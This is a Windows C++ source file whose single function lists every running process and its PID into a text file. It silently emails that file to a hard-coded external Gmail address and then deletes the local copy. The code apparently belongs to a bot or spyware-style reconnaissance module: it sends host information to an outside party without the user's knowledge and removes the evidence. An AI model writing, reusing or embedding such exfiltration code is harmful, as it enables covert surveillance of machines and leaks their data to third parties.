#include "listProgram.h"
#include <filesystem>

void list_programs() {
  const string filename = "process_list.txt";
  ofstream outFile(filename);
  if (!outFile) {
    cerr << "Failed to create output file." << endl;
    return;
  }

  HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnapshot == INVALID_HANDLE_VALUE) {
    cerr << "Failed to create process snapshot." << endl;
    return;
  }

  PROCESSENTRY32 pe32;
  pe32.dwSize = sizeof(PROCESSENTRY32);

  outFile << "=== Running Processes ===" << endl;
  if (Process32First(hSnapshot, &pe32)) {
    do {
      // Convert WCHAR to std::string (ASCII-safe)
      string processName;
      for (int i = 0; pe32.szExeFile[i] != '\0'; ++i) {
        processName += static_cast<char>(pe32.szExeFile[i]);
      }

      outFile << "- " << processName << " (PID: " << pe32.th32ProcessID << ")"
              << endl;

    } while (Process32Next(hSnapshot, &pe32));
  } else {
    outFile << "Failed to retrieve process list." << endl;
  }

  CloseHandle(hSnapshot);
  outFile << "==========================" << endl;
  outFile.close();

  cout << "Process list written to: " << std::filesystem::absolute(filename) << endl;


  Sleep(1000);
    ifstream test_file("process_list.txt");
    if (test_file.good()) {
      test_file.close();
      send_email_with_attachment(
          "serverbottestmmt@gmail.com", "Running Process List",
          "Attached is the current process list.", "process_list.txt");
    } else {
      cerr << "Failed to create process list file" << endl;
    }
  
  if (std::filesystem::remove(filename)) {
    cout << "File deleted after sending." << endl;
  } else {
    cerr << "Failed to delete the file." << endl;
  }
}